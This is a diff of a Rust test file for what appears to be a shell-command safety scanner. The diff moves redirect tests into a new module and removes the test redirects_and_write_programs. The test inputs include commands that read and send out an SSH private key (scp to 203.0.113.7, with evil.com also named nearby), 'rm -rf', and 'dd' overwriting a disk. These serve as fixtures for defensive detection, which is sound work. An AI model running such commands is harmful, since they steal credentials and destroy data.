@@ -1,5 +1,6 @@
 mod database;
 mod quotes;
+mod redirects;
 mod stdin;
 mod text;
 mod venv;
@@ -170,35 +171,6 @@ fn inline_interpreters_are_scanned() {
     assert!(has_net(&a, "evil.com"));
     let a = parsed(r#"node -e "require('fs').readFileSync('/Users/me/.ssh/id_rsa')""#);
     assert!(has_read(&a, "/Users/me/.ssh/id_rsa"));
-}
-
-#[test]
-fn redirects_and_write_programs() {
-    assert!(has_write(&parsed("echo x > ~/.zshrc"), "/Users/me/.zshrc"));
-    assert!(has_write(&parsed("echo x >>~/.zshrc"), "/Users/me/.zshrc"));
-    assert!(has_write(&parsed("cmd &> ./out.log"), "/p/out.log"));
-    let a = parsed("scp ~/.ssh/id_rsa user@203.0.113.7:/tmp/");
-    assert!(has_read(&a, "/Users/me/.ssh/id_rsa"));
-    assert!(has_net(&a, "203.0.113.7"));
-    let a = parsed("cp ~/.ssh/id_rsa ./key");
-    assert!(has_read(&a, "/Users/me/.ssh/id_rsa"));
-    assert!(has_write(&a, "/p/key"));
-    assert!(has_write(&parsed("rm -rf ./build"), "/p/build"));
-    let a = parsed("mv ~/.moat /tmp/old");
-    assert!(
-        has_write(&a, "/Users/me/.moat"),
-        "mv removes its source: {a:?}"
-    );
-    assert!(has_write(&a, "/tmp/old"));
-    assert!(has_read(&parsed("sort < ./in.txt"), "/p/in.txt"));
-    assert!(has_write(&parsed("sed -i '' s/a/b/ ./f.txt"), "/p/f.txt"));
-    let a = parsed("dd if=/dev/zero of=/dev/disk2");
-    assert!(has_write(&a, "/dev/disk2"));
-    assert!(
-        !parsed("cmd 2>&1")
-            .iter()
-            .any(|x| matches!(x, AtomicAction::FsWrite { .. }))
-    );
 }
 
 #[test]
